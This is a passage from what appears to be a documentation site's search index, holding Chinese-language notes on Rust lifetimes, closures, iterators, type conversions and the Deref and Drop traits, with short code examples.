\u751f\u547d\u5468\u671f\u8bed\u6cd5\u7528\u6765\u5c06\u51fd\u6570\u7684\u591a\u4e2a\u5f15\u7528\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u4f5c\u7528\u57df\u5173\u8054\u5230\u4e00\u8d77\uff0c\u907f\u514d\u4e86\u60ac\u5782\u5f15\u7528 \u8fd4\u56de\u503c\u662f\u5f15\u7528\u65f6\uff0c\u5176\u751f\u547d\u5468\u671f\u53ea\u80fd\u6765\u81ea\u53c2\u6570\uff0c\u6765\u81ea\u51fd\u6570\u4f53\u5185\u90e8\u7684\u8bdd\u5c31\u662f\u60ac\u5782\u5f15\u7528 \u7ed3\u6784\u4f53\u4e2d\u751f\u547d\u5468\u671f \u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4fdd\u8bc1\u5185\u90e8\u5f15\u7528\u7c7b\u578b\u7684\u53c2\u6570\u6d3b\u5f97\u6bd4\u7ed3\u6784\u4f53\u672c\u8eab\u957f struct MyStruct <' a > { string : & ' a str , } \u5982\u4e0b\u4f8b\u5373\u662f\u7ed3\u6784\u4f53\u83b7\u5f97\u6bd4\u5185\u90e8\u53c2\u6570\u957f\uff0c\u4f1a\u62a5\u9519\uff1a let i ; { let string = String :: from ( \"test\" ); i = MyStruct { string : string . as_str () }; } println! ( \"{:?}\" , i ); \u751f\u547d\u5468\u671f\u6d88\u9664 \u6709\u65f6\u7f16\u8bd1\u5668\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u751f\u547d\u5468\u671f\uff0c\u4e0d\u9700\u8981\u663e\u793a\u6807\u6ce8 \u6d88\u9664\u89c4\u5219\uff08\u63a8\u6d4b\u89c4\u5219\uff09 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6bcf\u4e00\u4e2a\u5f15\u7528\u53c2\u6570\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a\u72ec\u81ea\u7684\u751f\u547d\u5468\u671f \u5982\u679c\u53ea\u6709\u4e00\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff08\u53c2\u6570\u7684\u751f\u547d\u5468\u671f\uff0c\u5373\u53ea\u6709\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b\u53c2\u6570\uff09\uff0c\u5219\u8be5\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f \u5982\u679c\u5b58\u5728\u591a\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff0c\u4f46\u5176\u4e2d\u4e00\u4e2a\u662f & self \u6216 & mut self \uff0c\u5219 self \u7684\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f \u95ed\u5305\u4e0d\u4f1a\u9075\u5faa\u8fd9\u4e2a\u89c4\u5219 impl \u5757\u751f\u547d\u5468\u671f\u6d88\u9664\uff08\u5373\u7701\u7565\uff09 impl \u5757\u4e2d\u6ca1\u6709\u7528\u5230\u7684\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4f7f\u7528 '_ \u6765\u8fdb\u884c\u7701\u7565\uff1a impl <' a > .. . for .. . <' a > {} impl .. . for .. . <' _ > {} \u4e3a\u5e26\u6709\u751f\u547d\u5468\u671f\u7684\u7ed3\u6784\u4f53\u5b9e\u73b0\u65b9\u6cd5 \u9700\u8981\u50cf\u6cdb\u578b\u4e00\u6837\u4e3a impl \u548c\u7ed3\u6784\u4f53\u540d\u90fd\u6807\u6ce8\u4e0a\u751f\u547d\u5468\u671f impl <' a > MyStruct <' a > { fn method ( & self , another_str : & str ) -> & str { println! ( \"{}\" , another_str ); self . string } } \u4e0a\u9762\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u4e0d\u4e3a method \u6807\u6ce8\u751f\u547d\u5468\u671f\uff0c\u56e0\u4e3a\u6839\u636e\u4e0a\u9762\u6d88\u9664\u89c4\u5219\u7684\u7b2c\u4e00\u548c\u7b2c\u4e09\u6761\uff0c\u4f1a\u81ea\u52a8\u63a8\u6d4b\u4e3a\u8fd4\u56de\u503c\u6807\u4e0a\u548c & self \u4e00\u6837\u7684\u751f\u547d\u5468\u671f \u751f\u547d\u5468\u671f\u7ea6\u675f \u5982\u60f3\u8981\u4e3a\u4e0a\u9762 method \u7684\u8fd4\u56de\u503c\u8d4b\u4e0a\u548c another_str \u4e00\u6837\u7684\u751f\u547d\u5468\u671f\uff0c\u5219\u9700\u8981\u4fdd\u8bc1\u8fd9\u4e2a\u751f\u547d\u5468\u671f\u8981\u6bd4 self \u7684\u751f\u547d\u5468\u671f\u5c0f\uff0c\u4f7f\u7528 ' a : ' b \u8bed\u6cd5\u6765\u8868\u793a 'a \u4e00\u5b9a\u4e0d\u5c0f\u4e8e 'b impl <' a : ' b , ' b > MyStruct <' a > { fn method ( &' a self , another : & ' b str ) -> & ' b str { println! ( \"{}\" , another ); self . string } } \u6216\u8005\u4f7f\u7528 where \u6765\u5355\u72ec\u5bf9\u4e00\u4e2a\u65b9\u6cd5\u8fdb\u884c\u7ea6\u675f\uff1a impl <' a > MyStruct <' a > { fn method <' b > ( &' a self , another : & ' b str ) -> & ' b str where ' a : ' b { println! ( \"{}\" , another ); self . string } } T: 'a \u8868\u793a\u7c7b\u578b T \u5fc5\u987b\u83b7\u5f97\u6bd4 'a \u4e45\uff1a struct Ref <' a , T : ' a > { r : & ' a T } \u9759\u6001\u751f\u547d\u5468\u671f \u548c\u6574\u4e2a\u7a0b\u5e8f\u6d3b\u5f97\u4e00\u6837\u4e45\u7684\u5f15\u7528\u53ef\u4ee5\u4f7f\u7528 'static \u6765\u6807\u6ce8\uff08\u4f8b\u5982\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\uff09 &'static \u4ec5\u9488\u5bf9\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u6301\u6709\u8be5\u5f15\u7528\u7684\u53d8\u91cf \u53d6\u60a6\u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528 T: 'static\uff0c\u5373\u4f7f T \u4e0d\u662f static \u7684 fn static_bound < T : Display + ' static > ( t : & T ) { println! ( \"{}\" , t ); } fn main () { let s1 = \"String\" . to_string (); static_bound ( & s1 ); } NLL\uff08Non-Lexical Lifetime\uff09\u89c4\u5219 Rust 1.31 \u540e\u5f15\u7528\u7684\u751f\u547d\u5468\u671f\u4ece\u501f\u7528\u5904\u5f00\u59cb\u4e00\u76f4\u6301\u7eed\u5230 \u6700\u540e\u4e00\u6b21\u4f7f\u7528\u7684\u5730\u65b9 Reborrow \u518d\u501f\u7528 let mut p = Point { x : 0 , y : 0 }; let r = & mut p ; let rr : & Point = &* r ; println! ( \"{:?}\" , rr ); r . move_to ( 10 , 10 ) println! ( \"{:?}\" , r ); \u53ef\u53d8\u501f\u7528\u548c\u4e0d\u53ef\u53d8\u7684\u5b83\u7684\u518d\u501f\u7528\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u80fd\u5728\u518d\u501f\u7528\u7684\u751f\u547d\u5468\u671f\u5185\u4f7f\u7528\u53ef\u53d8\u501f\u7528\u3002\u4e5f\u5c31\u662f\u4e0a\u9762\u4f8b\u5b50\u4e2d\u5728 rr \u7684\u751f\u547d\u5468\u671f\u5185\u4e0d\u80fd\u4f7f\u7528 r\uff08rr \u7684\u751f\u547d\u5468\u671f\u7531\u4e8e NLL \u89c4\u5219\uff0c\u5230\u7b2c\u4e00\u4e2a println! \u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u540e\u9762\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528 r\uff09","title":"\u751f\u547d\u5468\u671f"},{"location":"cs/pl/rust/basic/#_57","text":"","title":"\u95ed\u5305\u548c\u8fed\u4ee3\u5668"},{"location":"cs/pl/rust/basic/#_58","text":"\u4e00\u79cd\u533f\u540d\u51fd\u6570\uff0c\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u51fd\u6570\uff0c\u4f46\u53ef\u4ee5\u6355\u83b7\u8c03\u7528\u8005\u4f5c\u7528\u57df\u4e2d\u7684\u503c let x = 1 ; let sum = | y | x + y ; assert_eq! ( 3 , sum ( 2 )); \u95ed\u5305\u8bed\u6cd5\uff1a | para1 , para2 , .. . | { statement1 ; statement2 ; expression } | para1 , para2 , .. . | expression \u7c7b\u578b\u63a8\u5bfc \u95ed\u5305\u4e0d\u4f1a\u4f5c\u4e3a api \u5bf9\u5916\u63d0\u4f9b\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f9d\u9760\u7f16\u8bd1\u5668\u7684\u7c7b\u578b\u63a8\u5bfc\u80fd\u529b\uff0c\u65e0\u9700\u624b\u52a8\u6807\u6ce8 ```rust let sum = |x, y| x + y; let v = sum(1, 2) // \u7f16\u8bd1\u5668\u901a\u8fc7\u8fd9\u53e5\u63a8\u5bfc\u51fa\u7c7b\u578b ```` \u4f46\u5f53\u95ed\u5305\u53ea\u58f0\u660e\u6ca1\u6709\u4f7f\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u80fd\u63a8\u5bfc\u51fa\u7c7b\u578b\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8 \u5f53\u7f16\u8bd1\u5668\u63a8\u5bfc\u51fa\u4e00\u79cd\u7c7b\u578b\u4e4b\u540e\uff0c\u5c31\u4f1a\u4e00\u76f4\u4f7f\u7528\u8be5\u7c7b\u578b\uff0c\u800c\u4e0d\u80fd\u5c06\u95ed\u5305\u5f53\u4f5c\u6cdb\u578b\u4f7f\u7528 \u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u95ed\u5305 struct Cacher < T , E > where T : Fn ( E ) -> E , E : Copy { query : T , value : Option < E > , } \u95ed\u5305\u7c7b\u578b\u4e00\u5b9a\u8981\u901a\u8fc7\u6cdb\u578b\u6765\u5b9a\u4e49\uff0c\u56e0\u4e3a\u4e0d\u540c\u5b9e\u73b0\u7684\u7c7b\u578b\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u8981\u6c42\u4ec5\u4ec5\u662f\u5b9e\u73b0 Fn(E) -> E \u8fd9\u4e2a trait\uff0c\u5373\u8f93\u5165 E \u8fd4\u56de E \u4e09\u79cd Fn trait FnOnce\uff1a\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\uff08\u4f1a\u5e26\u8d70\u88ab\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff09 \u5e26\u8d70\u6240\u6709\u6743\u7684\u4f8b\u5b50\uff1a let x = String :: from ( \"test\" ); let sum = | y | x + y ; println! ( \"{}\" , sum ( \"test\" )); println! ( \"{}\" , x ); // \u62a5\u9519\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8fdb\u5165\u4e86\u95ed\u5305\u4e2d \u4ec5\u5b9e\u73b0\u4e86 FnOnce \u7684\u95ed\u5305\u5728\u8c03\u7528\u65f6\u4f1a\u8f6c\u79fb\u6240\u6709\u6743\uff0c\u4e0d\u80fd\u8c03\u7528\u4e24\u6b21\uff1a fn fn_once < F > ( func : F ) where F : FnOnce ( usize ) -> bool { func ( 1 ); func ( 2 ); // \u62a5\u9519 } \u4f46\u662f\u7ed9 F \u52a0\u4e00\u4e2a Copy \u7684\u7ea6\u675f\u5219\u53ef\u4ee5\u8c03\u7528\u591a\u6b21 \u5728\u53c2\u6570\u5217\u8868\u524d\u52a0 move \u5173\u952e\u5b57\u5f3a\u5236\u95ed\u5305\u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff08\u805a\u7126\u4e8e\u5982\u4f55\u6355\u83b7\u53d8\u91cf\uff09 FnMut\uff1a\u4ee5\u53ef\u53d8\u501f\u7528\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c \u76f4\u63a5\u8c03\u7528\u65f6\u9700\u8981\u5c06\u95ed\u5305\u6807\u8bb0\u4e3a mut let mut s = String :: new (); let mut update_string = | st | s . push_str ( st ); update_string ( \"test\" ); \u5f53\u4f5c\u53d8\u91cf\u65f6\u4e0d\u9700\u8981\u6807\u8bb0\u4e3a mut fn exec <' a , F : FnMut ( &' a str ) > ( mut f : F ) { // \u8fd9\u91cc\u9700\u8981 mut f ( \"test\" ); } fn main () { let mut s = String :: new (); let update_string = | st | s . push_str ( st ); // \u8fd9\u91cc\u4e0d\u9700\u8981 mut exec ( update_string ); } Fn\uff1a\u4ee5\u4e0d\u53ef\u53d8\u501f\u7528\u7684\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c \u4e00\u4e2a\u95ed\u5305\u5b9e\u73b0\u4e86\u54ea\u79cd Fn trait \u53d6\u51b3\u4e8e\u8be5\u95ed\u5305 \u5982\u4f55\u4f7f\u7528 \u88ab\u6355\u83b7\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u662f\u5982\u4f55\u6355\u83b7\u3002\u800c move \u5219\u5173\u6ce8\u4e8e\u5982\u4f55\u6355\u83b7\uff0c\u6709 move \u5219\u5f3a\u5236\u83b7\u53d6\u6240\u6709\u6743 \u4f7f\u7528\u4e86 move \u5173\u952e\u5b57\u4ecd\u7136\u53ef\u4ee5\u5b9e\u73b0 Fn trait\uff08\u5f53\u95ed\u5305\u5bf9\u4e8e\u6355\u83b7\u53d8\u91cf\u7684\u4f7f\u7528\u4ec5\u4ec5\u662f\u4e0d\u53ef\u53d8\u501f\u7528\u65f6\uff09 \u4e09\u79cd Fn \u7684\u5173\u7cfb pub trait Fn < Args > : FnMut < Args > { extern \"rust-call\" fn call ( & self , args : Args ) -> Self :: Output ; } pub trait FnMut < Args > : FnOnce < Args > { extern \"rust-call\" fn call_mut ( & mut self , args : Args ) -> Self :: Output ; } pub trait FnOnce < Args > { type Output ; extern \"rust-call\" fn call_once ( self , args : Args ) -> Self :: Output ; } \u6240\u6709\u95ed\u5305\u90fd\u4f1a\u5b9e\u73b0 FnOnce trait\uff0c\u56e0\u4e3a\u81f3\u5c11\u53ef\u4ee5\u88ab\u8c03\u7528\u4e00\u6b21 \u6ca1\u6709\u79fb\u51fa\u6355\u83b7\u53d8\u91cf\u6240\u6709\u6743\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 FnMut trait \u4e0d\u9700\u8981\u5bf9\u6355\u83b7\u53d8\u91cf\u8fdb\u884c\u6539\u53d8\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 Fn trait \u5b9e\u73b0 Fn \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnMut\uff0c\u5b9e\u73b0 FnMut \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnOnce Fn \u83b7\u53d6 &self\u3001FnMut \u83b7\u53d6 &mut self\u3001FnOnce \u83b7\u53d6 self \u5efa\u8bae\u5148\u4f7f\u7528 Fn\uff0c\u7136\u540e\u9760\u7f16\u8bd1\u5668\u6765\u5224\u65ad\u6b63\u8bef\u4ee5\u53ca\u5982\u4f55\u9009\u62e9 \u95ed\u5305\u4f5c\u4e3a\u8fd4\u56de\u503c \u4e0d\u80fd\u4f7f\u7528 Fn(...) -> ... \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u5b83\u662f\u7279\u5f81\uff0c\u6ca1\u6709\u56fa\u5b9a\u5185\u5b58\u5927\u5c0f \u53ef\u4ee5\u4f7f\u7528 impl Fn(...) -> ... \u4f5c\u4e3a\u8fd4\u56de\u503c \u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61\uff0c\u5373 Box<dyn Fn(...) -> ...> \u7684\u5f62\u5f0f","title":"\u95ed\u5305"},{"location":"cs/pl/rust/basic/#_59","text":"for \u5faa\u73af\u904d\u5386\u6570\u7ec4\u5b9e\u9645\u4e0a\u662f\u5728\u6570\u7ec4\u4e0a\u8c03\u7528\u4e86 into_iter \u65b9\u6cd5\uff08\u6765\u81ea IntoIterator trait\uff09 Iterator trait pub trait Iterator { type Item ; fn next ( & mut self ) -> Option < Self :: Item > ; } next \u65b9\u6cd5\u6709\u503c\u65f6\u8fd4\u56de Some(...)\uff0c\u8fed\u4ee3\u7ed3\u675f\u5219\u8fd4\u56de None \u624b\u52a8\u8fed\u4ee3\u5fc5\u987b\u58f0\u660e\u8fed\u4ee3\u5668\u4e3a mut \u4ec5\u9700\u8981\u5b9e\u73b0 next \u65b9\u6cd5\uff0c\u5176\u5b83\u65b9\u6cd5\u6709\u9ed8\u8ba4\u5b9e\u73b0 IntoIterator trait Iterator \u81ea\u52a8\u5b9e\u73b0 IntoIterator impl < I : Iterator > IntoIterator for I { type Item = I :: Item ; type IntoIter = I ; #[inline] fn into_iter ( self ) -> I { self } } into_iter\u3001iter\u3001iter_mut .into_iter \u4f1a\u593a\u8d70\u6240\u6709\u6743 .iter \u662f\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&T) .iter_mut \u662f\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&mut T) \u6d88\u8d39\u8005\u9002\u914d\u5668 \u5185\u90e8\u8c03\u7528\u4e86 next \u7684\u8fed\u4ee3\u5668\u65b9\u6cd5\uff0c\u4f1a\u6d88\u8017\u8fed\u4ee3\u5668\u4e0a\u5143\u7d20\uff0c\u8fd4\u56de\u5176\u5b83\u503c\uff0c\u79f0\u4e3a\u6d88\u8d39\u8005\u9002\u914d\u5668 \u4f8b\u5982 .sum \u65b9\u6cd5\uff0c\u5185\u90e8\u8c03\u7528 next \u6765\u5bf9\u6240\u6709\u5143\u7d20\u6c42\u548c\uff0c\u4e5f\u4f1a\u62ff\u8d70\u8fed\u4ee3\u5668\u7684\u6240\u6709\u6743 collect \u65b9\u6cd5\u53ef\u4ee5\u5c06\u8fed\u4ee3\u5668\u4e2d\u7684\u503c\u6536\u96c6\u5230\u96c6\u5408\u7c7b\u578b\u4e2d\uff0c\u4f46\u9700\u8981\u5148\u6807\u6ce8\u8981\u6536\u96c6\u5230\u7684\u7c7b\u578b let v : Vec < _ > = iterator . collect (); \u8fed\u4ee3\u5668\u9002\u914d\u5668 \u8fed\u4ee3\u5668\u9002\u914d\u5668\u6216\u8fd4\u56de\u65b0\u7684\u8fed\u4ee3\u5668 \u4f8b\u5982 .map .filter .zip \u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff0c\u4e00\u822c\u4f7f\u7528 collect \u6536\u5c3e\u6536\u96c6\u5143\u7d20","title":"\u8fed\u4ee3\u5668"},{"location":"cs/pl/rust/basic/#_60","text":"newtype \u5373\u4f7f\u7528\u4e00\u4e2a\u5143\u7ec4\u7ed3\u6784\u4f53\u6765\u5305\u88c5 \u53ef\u4ee5\u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0\u5916\u90e8 trait \u53ef\u4ee5\u5177\u6709\u66f4\u597d\u7684\u53ef\u8bfb\u6027\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u578b\u5f02\u5316 \u7c7b\u578b\u522b\u540d \u5982 type Meters = u32 \u4ec5\u4ec5\u662f\u522b\u540d\uff0c\u5e76\u4e0d\u662f\u5168\u65b0\u7c7b\u578b\uff0c\u5373\u4e0a\u9762 Meters \u7c7b\u578b\u548c u32 \u5728\u7f16\u8bd1\u5668\u773c\u91cc\u6ca1\u6709\u533a\u522b \u53ef\u4ee5\u589e\u52a0\u53ef\u8bfb\u6027\u3001\u7b80\u5316\u4ee3\u7801 \u7528\u4e0d\u8fd4\u56de\u7c7b\u578b ! \u5bf9\u4e8e match\uff0c\u5404\u5206\u652f\u8fd4\u56de\u7684\u7c7b\u578b\u9700\u8981\u4e00\u81f4\uff0c\u4f46\u5982\u679c\u6709\u5206\u652f\u8fd4\u56de ! \u7c7b\u578b\uff0c\u5219\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e2a\u5206\u652f \u5b9a\u957f\u7c7b\u578b\u4e0e\u4e0d\u5b9a\u957f\u7c7b\u578b \u5b9a\u957f\u7c7b\u578b\u81ea\u52a8\u5b9e\u73b0 Sized trait\uff0c\u5e76\u4e14\u5728\u4f7f\u7528\u6cdb\u578b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6dfb\u52a0 Sized \u7ea6\u675f \u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u52a8\u6001\u5927\u5c0f\u7c7b\u578b\uff0cDST\uff09\uff0c\u5305\u62ec\u5207\u7247\u3001str\u3001\u7279\u5f81\u7b49\uff08Vec \u7b49\u96c6\u5408\u7c7b\u578b\u662f\u5b9a\u957f\u7684\uff0c\u56e0\u4e3a\u5728\u6808\u4e0a\u5b58\u50a8\u7684\u4fe1\u606f\u5b9a\u957f\uff09 DST \u65e0\u6cd5\u5355\u72ec\u4f7f\u7528\uff0c\u53ea\u80fd\u901a\u8fc7\u5f15\u7528\u6216\u8005 Box \u6765\u95f4\u63a5\u4f7f\u7528\uff0c\u5982\u5c06\u7279\u5f81\u5c01\u88c5\u4e3a\u7279\u5f81\u5bf9\u8c61 ?Size \u7279\u5f81\u8868\u793a\u65e2\u6709\u53ef\u80fd\u662f\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b\u4e5f\u6709\u53ef\u80fd\u662f DST\uff1a fn func < T : ? Sized > ( t : & T ) {} \u5c06 str \u5305\u88f9\u4e3a Box<str> \u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 Box::new(\"...\" as str)\uff0c\u56e0\u4e3a\u8fd9\u91cc\u5e76\u4e0d\u80fd\u77e5\u9053 str \u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 .into() \u6765\u8ba9\u7f16\u8bd1\u5668\u6765\u8f6c\u6362\u7c7b\u578b\uff08\u5c06 &str \u8f6c\u4e3a Box\uff09 let s : Box < str > = \"...\" . into (); \u6574\u6570\u4e0e\u679a\u4e3e\u7684\u7c7b\u578b\u8f6c\u6362 enum MyEnum { A = 1 , B = 2 , C = 3 , } \u5c06\u679a\u4e3e\u8f6c\u6362\u4e3a\u6574\u6570\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 as\uff1a let x = MyEnum :: A as i32 ; \u6574\u6570\u8f6c\u4e3a\u679a\u4e3e\u5219\u76f8\u5bf9\u590d\u6742\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5 \u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff1anum-traits num-derive \u6216 num_enums \u7b49 \u4f7f\u7528 TryFrom trait use std :: convert :: TryFrom ; impl TryFrom < i32 > for MyEnum { type Error = (); fn try_from ( v : i32 ) -> Result < Self , Self :: Error > { match v { x if x == MyEnum :: A as i32 => Ok ( MyEnum :: A ), x if x == MyEnum :: B as i32 => Ok ( MyEnum :: B ), x if x == MyEnum :: C as i32 => Ok ( MyEnum :: C ), _ => Err (()), } } } \u4e3a MyEnum \u5b9e\u73b0\u4e86 TryFrom<i32> \u540e\u5c31\u53ef\u4ee5\u8c03\u7528 i32.try_into() \u6765\u5c1d\u8bd5\u8f6c\u4e3a MyEnum \u4e86 let x = 1 match x . try_into () { Ok ( EyEnum :: A ) => .. ., .. . } \u4f7f\u7528 unsafe transmute \u8f6c\u6362 #[repr(i32)] // \u89c4\u5b9a\u5185\u90e8\u5b58\u50a8\u4e3a i32 enum MyEnum { .. . } let x : i32 = 1 ; let y : MyEnum = unsafe { std :: mem :: transmute ( x ) };","title":"\u6df1\u5165\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_61","text":"\u5f15\u7528\u4ec5\u662f\u501f\u7528\u6570\u636e\uff0c\u800c\u667a\u80fd\u6307\u9488\u5f80\u5f80\u53ef\u4ee5\u62e5\u6709\u6307\u5411\u7684\u6570\u636e \u667a\u80fd\u6307\u9488\u5b9e\u73b0\u4e86 Deref \u548c Drop trait Deref \u8ba9\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u50cf\u5f15\u7528\u4e00\u6837\u5de5\u4f5c Drop \u5141\u8bb8\u6307\u5b9a\u667a\u80fd\u6307\u9488\u8d85\u51fa\u4f5c\u7528\u57df\u540e\u81ea\u52a8\u6267\u884c\u7684\u4ee3\u7801","title":"\u667a\u80fd\u6307\u9488"},{"location":"cs/pl/rust/basic/#deref-trait","text":"use std :: ops :: Deref \u5b9e\u73b0\u4e86 Deref \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 * \u89e3\u5f15\u7528\u4e86 use std :: ops :: Deref struct MyBox < T > ( T ); impl < T > MyBox < T > { fn new ( x : T ) -> MyBox < T > { MyBox ( x ) } } impl < T > Deref for MyBox < T > { type Target = T ; fn deref ( & self ) -> & Self :: Target { & self . 0 } } deref \u8fd4\u56de\u5185\u90e8\u503c\u7684\u6b63\u5e38\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 * \u6765\u89e3\u5f15\u7528 \u5bf9 MyBox \u8fdb\u884c\u89e3\u5f15\u7528\u65f6\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f * ( x . deref ()) \u53c2\u6570\u4e2d\u9690\u5f0f Deref \u8f6c\u6362 fn func ( s : & str ) { println! ( \"{}\" , s ) } fn main () { let s = MyBox :: new ( String :: from ( \"...\" )); func ( & s ); } \u8c03\u7528\u65f6 &s: &MyBox -> &String -> &str \u5f15\u7528\u5f52\u4e00\u5316 \u667a\u80fd\u6307\u9488\u4f1a\u4ece\u7ed3\u6784\u4f53\u4e2d\u8131\u58f3\u51fa\u6765\u5f97\u5230\u5185\u90e8\u7684\u5f15\u7528\u7c7b\u578b \u591a\u91cd\u5f15\u7528\u53ef\u4ee5\u5f52\u4e00\u5316 impl < T : ? Sized > Deref for & T { type Target = T ; fn deref ( & self ) -> & T { * self // \u8fd9\u91cc self \u662f &&T \u7c7b\u578b } } DerefMut \u4e0e Deref \u5f53 T: Deref<Target=U> \u65f6\uff0c&T \u53ef\u4ee5\u8f6c\u6362\u4e3a &U\u3001&mut T \u4e5f\u53ef\u4ee5\u8f6c\u6362\u4e3a &U\uff08rust \u53ef\u4ee5\u628a\u53ef\u53d8\u5f15\u7528\u9690\u5f0f\u8f6c\u6362\u4e3a\u4e0d\u53ef\u53d8\u5f15\u7528\uff09 \u5f53 T: DerefMut<Target=U> \u65f6\uff0c&mut T \u53ef\u4ee5\u8f6c\u6362\u4e3a &mut U \u5b9e\u73b0 DerefMut trait \u9700\u8981\u5148\u5b9e\u73b0 Deref use std :: ops :: DerefMut ; impl < T > DerefMut for MyBox < T > { fn deref_mut ( & mut self ) -> & mut Self :: Target { & mut self . 0 } }","title":"Deref trait"},{"location":"cs/pl/rust/basic/#drop-trait","text":"\u53d8\u91cf\u79bb\u5f00\u4f5c\u7528\u57df\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6267\u884c Drop trait \u7684 drop \u65b9\u6cd5 \u53ef\u4ee5\u4e3a\u7ed3\u6784\u4f53\u81ea\u5b9a\u4e49 drop struct A ; struct B ; impl Drop for A { fn drop ( & mut self ) { println! ( \"drop A\" ) } } impl Drop for B { fn drop ( & mut self ) { println! ( \"drop B\" ) } } struct C { a : A , b : B , } impl Drop for C { fn drop ( & mut self ) { println! ( \"drop C\" ) } } fn main () { let x = C { a : A , b : B }; println! ( \"end\" ); } // end // drop C // drop A // drop B drop \u65b9\u6cd5\u501f\u7528\u76ee\u6807\u4f7f\u7528\u7684\u662f\u53ef\u53d8\u5f15\u7528\uff0c\u4e0d\u4f1a\u62ff\u8d70\u6240\u6709\u6743 \u7ed3\u6784\u4f53\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u4f1a drop \u5148\u58f0\u660e\u7684\u53d8\u91cf\u540e drop\u3001\u7ed3\u6784\u4f53\u5185\u90e8\u6309\u987a\u5e8f\u4f9d\u6b21 drop \u5373\u4f7f C \u4e0d\u624b\u52a8\u5b9e\u73b0 Drop\uff0c\u4e5f\u4f1a\u8c03\u7528\u5230 A \u548c B \u7684 drop\uff0c\u56e0\u4e3a\u4f1a\u4e3a C \u63d0\u4f9b\u9ed8\u8ba4\u7684 Drop \u5b9e\u73b0 .drop \u51fd\u6570\u4e0d\u80fd\u624b\u52a8\u8c03\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u501f\u7528\uff0c\u540e\u9762\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\u539f\u503c\uff0c\u4f46\u662f\u53ef\u80fd\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86 \u4f7f\u7528 std::mem::drop \u51fd\u6570\uff08\u5728 prelude \u4e2d\uff09\u6765\u624b\u52a8 drop std::mem::drop \u7684\u7b7e\u540d\uff1a pub fn drop < T > ( _x : T ) \u8fd9\u4e2a drop \u662f\u4e00\u4e2a\u7a7a\u5b9e\u73b0\uff0c\u5b83\u53ef\u4ee5\u5e26\u8d70\u76ee\u6807\u7684\u6240\u6709\u6743\uff0c\u7136\u540e\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\uff0c\u76ee\u6807\u7684\u4f5c\u7528\u57df\u4e5f\u5c31\u7ed3\u675f\u4e86\uff0c\u5bfc\u81f4\u81ea\u52a8\u8c03\u7528 drop \u65b9\u6cd5\u6765\u91ca\u653e \u65e0\u6cd5\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u5b9e\u73b0 Copy \u548c Drop","title":"Drop 